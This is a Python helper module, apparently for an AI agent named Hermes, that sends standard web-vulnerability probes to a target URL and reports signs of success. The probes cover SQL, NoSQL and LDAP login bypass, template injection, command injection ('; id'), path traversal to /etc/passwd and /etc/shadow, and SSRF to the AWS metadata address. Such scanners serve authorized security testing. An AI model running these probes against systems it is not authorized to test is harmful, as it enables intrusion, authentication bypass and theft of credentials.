"""
Quick Security Testing Wrapper for Hermes

Provides simple functions for common security testing tasks.
Import this after security_engine.py to get high-level testing functions.

Usage:
    exec(open(".../security_engine.py").read())
    exec(open(".../quick_test.py").read())
    
    # Test a login form for SQLi
    test_login_sqli("http://target/login")
    
    # Test all common vulns on an endpoint
    test_endpoint("http://target/search", "GET", {"q": "test"})
    
    # Map attack surface
    surface = map_surface("http://target/")
"""


def test_login_sqli(url, username_field="username", password_field="password"):
    """Test a login form for SQL injection."""
    scanner = SecurityScanner(url.rsplit('/', 1)[0])
    baseline = scanner.get_baseline("POST", url, data={username_field: "test", password_field: "test"})
    
    payloads = {
        "single_quote": "'",
        "or_true": "' OR 1=1--",
        "or_true_alt": "' OR '1'='1",
        "admin_comment": "admin'--",
        "or_empty": "' OR ''='",
    }
    
    print(f"[*] Testing SQLi on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
    
    results = []
    for name, payload in payloads.items():
        # Test username field
        test_data = {username_field: payload, password_field: "anything"}
        r = scanner._make_request("POST", url, data=test_data)
        
        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()
        
        if analysis["interesting"]:
            print(f"[!] INTERESTING: {name}")
            for d in analysis["differences"]:
                print(f"    - {d}")
            results.append({"payload": name, "interesting": True, "analysis": analysis})
        else:
            print(f"[-] No change: {name}")
    
    return results


def test_ssti(url, method="POST", param_name="template"):
    """Test an endpoint for Server-Side Template Injection."""
    scanner = SecurityScanner(url.rsplit('/', 1)[0])
    if method.upper() in ('POST', 'PUT', 'PATCH'):
        baseline = scanner.get_baseline(method, url, data={param_name: "test"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "test"})
    
    payloads = {
        "math_7x7": "{{7*7}}",
        "math_7x49": "{{7*49}}",
        "config": "{{config}}",
        "self": "{{self}}",
    }
    
    print(f"[*] Testing SSTI on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
    
    results = []
    for name, payload in payloads.items():
        if method.upper() in ('POST', 'PUT', 'PATCH'):
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})
        
        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()
        
        if analysis["interesting"]:
            print(f"[!] INTERESTING: {name}")
            for d in analysis["differences"]:
                print(f"    - {d}")
            # Check for SSTI evaluation
            if "49" in r.text and "7*7" in payload:
                print(f"    [!] SSTI CONFIRMED - 7*7 evaluated to 49!")
            if "343" in r.text and "7*49" in payload:
                print(f"    [!] SSTI CONFIRMED - 7*49 evaluated to 343!")
            results.append({"payload": name, "interesting": True, "analysis": analysis})
        else:
            print(f"[-] No change: {name}")
    
    return results


def test_command_injection(url, method="GET", param_name="input"):
    """Test an endpoint for command injection."""
    scanner = SecurityScanner(url.rsplit('/', 1)[0])
    
    if method.upper() in ('POST', 'PUT', 'PATCH'):
        baseline = scanner.get_baseline(method, url, data={param_name: "test"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "test"})
    
    payloads = {
        "semicolon_id": "; id",
        "pipe_id": "| id",
        "backtick_id": "`id`",
        "dollar_id": "$(id)",
        "whoami": "; whoami",
    }
    
    print(f"[*] Testing command injection on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
    
    results = []
    for name, payload in payloads.items():
        if method.upper() in ('POST', 'PUT', 'PATCH'):
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})
        
        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()
        
        if analysis["interesting"]:
            print(f"[!] INTERESTING: {name}")
            for d in analysis["differences"]:
                print(f"    - {d}")
            if "uid=" in r.text or "gid=" in r.text:
                print(f"    [!] COMMAND EXECUTION CONFIRMED!")
            results.append({"payload": name, "interesting": True, "analysis": analysis})
        else:
            print(f"[-] No change: {name}")
    
    return results


def test_path_traversal(url, method="GET", param_name="file"):
    """Test an endpoint for path traversal."""
    scanner = SecurityScanner(url.rsplit('/', 1)[0])
    
    if method.upper() in ('POST', 'PUT', 'PATCH'):
        baseline = scanner.get_baseline(method, url, data={param_name: "test.txt"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "test.txt"})
    
    payloads = {
        "passwd_1": "../../../etc/passwd",
        "passwd_2": "../../../../../../etc/passwd",
        "shadow": "../../../../../../etc/shadow",
        "hosts": "../../../../../../etc/hosts",
    }
    
    print(f"[*] Testing path traversal on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
    
    results = []
    for name, payload in payloads.items():
        if method.upper() in ('POST', 'PUT', 'PATCH'):
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})
        
        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()
        
        if analysis["interesting"]:
            print(f"[!] INTERESTING: {name}")
            for d in analysis["differences"]:
                print(f"    - {d}")
            if "root:x:0:" in r.text:
                print(f"    [!] PATH TRAVERSAL CONFIRMED - /etc/passwd content found!")
            results.append({"payload": name, "interesting": True, "analysis": analysis})
        else:
            print(f"[-] No change: {name}")
    
    return results


def test_nosqli(url, username_field="username", password_field="password"):
    """Test a JSON login endpoint for NoSQL injection."""
    scanner = SecurityScanner(url.rsplit('/', 1)[0])
    baseline = scanner.get_baseline("POST", url, json={username_field: "test", password_field: "test"})
    
    payloads = {
        "ne_null_username": {username_field: {"$ne": None}, password_field: "x"},
        "ne_null_both": {username_field: {"$ne": None}, password_field: {"$ne": None}},
        "ne_empty": {username_field: {"$ne": ""}, password_field: {"$ne": ""}},
        "gt_empty": {username_field: {"$gt": ""}, password_field: {"$gt": ""}},
        "regex_all": {username_field: {"$regex": ".*"}, password_field: {"$regex": ".*"}},
    }
    
    print(f"[*] Testing NoSQL injection on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
    
    results = []
    for name, payload in payloads.items():
        r = scanner._make_request("POST", url, json=payload)
        
        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()
        
        if analysis["interesting"]:
            print(f"[!] INTERESTING: {name}")
            for d in analysis["differences"]:
                print(f"    - {d}")
            if "logged_in" in r.text or "success" in r.text.lower():
                print(f"    [!] AUTH BYPASS CONFIRMED!")
            results.append({"payload": name, "interesting": True, "analysis": analysis})
        else:
            print(f"[-] No change: {name}")
    
    return results


def test_ldap_injection(url, username_field="username", password_field="password"):
    """Test a login endpoint for LDAP injection."""
    scanner = SecurityScanner(url.rsplit('/', 1)[0])
    baseline = scanner.get_baseline("POST", url, data={username_field: "test", password_field: "test"})
    
    payloads = {
        "wildcard_both": {username_field: "*", password_field: "*"},
        "wildcard_user": {username_field: "*", password_field: "x"},
        "or_true": {username_field: "*)(uid=*))(|(uid=*", password_field: "x"},
    }
    
    print(f"[*] Testing LDAP injection on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
    
    results = []
    for name, payload in payloads.items():
        r = scanner._make_request("POST", url, data=payload)
        
        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()
        
        if analysis["interesting"]:
            print(f"[!] INTERESTING: {name}")
            for d in analysis["differences"]:
                print(f"    - {d}")
            if "logged_in" in r.text or "success" in r.text.lower() or "uid" in r.text:
                print(f"    [!] LDAP INJECTION CONFIRMED!")
            results.append({"payload": name, "interesting": True, "analysis": analysis})
        else:
            print(f"[-] No change: {name}")
    
    return results


def test_ssrf(url, method="POST", param_name="url"):
    """Test an endpoint for SSRF."""
    scanner = SecurityScanner(url.rsplit('/', 1)[0])
    if method.upper() in ('POST', 'PUT', 'PATCH'):
        baseline = scanner.get_baseline(method, url, data={param_name: "http://example.com"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "http://example.com"})
    
    payloads = {
        "localhost": "http://127.0.0.1",
        "localhost_alt": "http://localhost",
        "aws_metadata": "http://169.254.169.254/latest/meta-data/",
        "octal": "http://0177.0.0.1",
        "decimal": "http://2130706433",
    }
    
    print(f"[*] Testing SSRF on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
    
    results = []
    for name, payload in payloads.items():
        if method.upper() in ('POST', 'PUT', 'PATCH'):
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})
        
        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()
        
        if analysis["interesting"]:
            print(f"[!] INTERESTING: {name}")
            for d in analysis["differences"]:
                print(f"    - {d}")
            if "AccessKeyId" in r.text or "meta-data" in r.text:
                print(f"    [!] SSRF CONFIRMED - Internal service accessed!")
            results.append({"payload": name, "interesting": True, "analysis": analysis})
        else:
            print(f"[-] No change: {name}")
    
    return results


def map_surface(base_url):
    """Map the attack surface of a target."""
    scanner = SecurityScanner(base_url)
    surface = scanner.map_surface("/")
    
    print(f"[*] Attack Surface Map for {base_url}")
    print(f"[*] Status: {surface.get('status_code')}")
    print(f"[*] Technology: {', '.join(surface.get('tech_hints', []))}")
    print(f"\n[*] Forms found: {len(surface.get('forms', []))}")
    for i, form in enumerate(surface.get('forms', [])):
        print(f"  Form {i+1}: {form['method']} {form['action']}")
        for inp in form['inputs']:
            print(f"    - {inp['name']} (value: {inp['value']})")
    
    print(f"\n[*] Links found: {len(surface.get('links', []))}")
    for link in surface.get('links', [])[:20]:
        print(f"  - {link}")
    if len(surface.get('links', [])) > 20:
        print(f"  ... and {len(surface['links']) - 20} more")
    
    return surface
